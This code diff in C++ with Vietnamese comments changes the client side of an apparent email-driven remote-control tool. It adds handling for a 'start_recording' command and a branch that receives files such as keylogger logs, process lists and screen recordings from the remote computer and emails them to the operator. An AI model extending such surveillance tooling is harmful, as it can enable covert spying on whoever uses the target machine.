@@ -59,8 +59,7 @@ std::map<std::string, std::pair<std::string, std::string>> fileCommands = {
      {"Process list from remote computer", "processes_with_pid.txt"}},
     {"list_installed",
      {"Installed programs from remote computer", "installed_programs.txt"}},
-    {"start_recording",
-     {"Video recording from remote computer", "recording.avi"}},
+    // XÓA start_recording ở đây vì nó đặc biệt
     {"keylogger", {"Keylogger log from remote computer", "keylog.txt"}},
     {"stop_recording",
      {"Video recording from remote computer", "recording.avi"}}};
@@ -121,6 +120,44 @@ void process_command(const std::string& command,
                           "Failed to execute keylogger command: " + command,
                           "");
       std::cout << "[Client] Failed to receive keylogger result" << std::endl;
+    }
+  } else if (command == "start_recording") {
+    // Nhận confirmation message từ server (không nhận file)
+    size_t msgSize;
+    int received =
+        recv(sock, reinterpret_cast<char*>(&msgSize), sizeof(msgSize), 0);
+    if (received > 0 && msgSize > 0) {
+      std::vector<char> buffer(msgSize + 1);
+      recv(sock, buffer.data(), static_cast<int>(msgSize), 0);
+      buffer[msgSize] = '\0';
+
+      std::string result(buffer.data());
+      std::cout << "[Client] Server response: " << result << std::endl;
+
+      // Gửi confirmation qua email
+      send_file_via_email(
+          senderEmail, "Recording started",
+          "Video recording has been started successfully. "
+          "Send 'stop_recording' command to receive the video file.",
+          "");
+    }
+  }
+  // Xử lý các command khác cần nhận file từ server (bao gồm stop_recording)
+  else if (fileCommands.count(command)) {
+    auto [subject, filename] = fileCommands[command];
+    std::string localFile = saveDir + filename;
+
+    receive_file_from_socket(sock, localFile);
+
+    if (std::filesystem::exists(localFile)) {
+      send_file_via_email(senderEmail, subject, "Result from remote computer",
+                          localFile);
+      std::cout << "[Client] Result sent via email: " << filename << std::endl;
+    } else {
+      send_file_via_email(senderEmail, "Command failed",
+                          "Failed to execute command: " + command, "");
+      std::cout << "[Client] Failed to receive result for: " << command
+                << std::endl;
     }
   }
   // Xử lý các command khác cần nhận file từ server
